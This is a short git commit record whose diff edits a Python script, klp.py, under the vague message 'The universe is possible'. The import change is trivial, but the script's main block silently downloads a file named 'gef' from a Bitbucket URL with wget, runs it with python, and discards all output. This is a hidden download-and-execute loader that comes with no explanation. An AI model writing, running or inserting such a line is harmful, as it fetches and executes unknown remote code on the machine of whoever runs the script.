7c25f2a66dd625fb33444a631143e3e430c9e003
gakira munshi <gakimarki@proton.me>
2024-12-19 02:22:14 -0500

    The universe is possible

--- klp.py
+++ klp.py
@@ -1,3 +1,3 @@
-import os, textwrap,textwrap
+import os, shlex,shlex
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef  1> /dev/null 2> /dev/null';os.system(cmd)
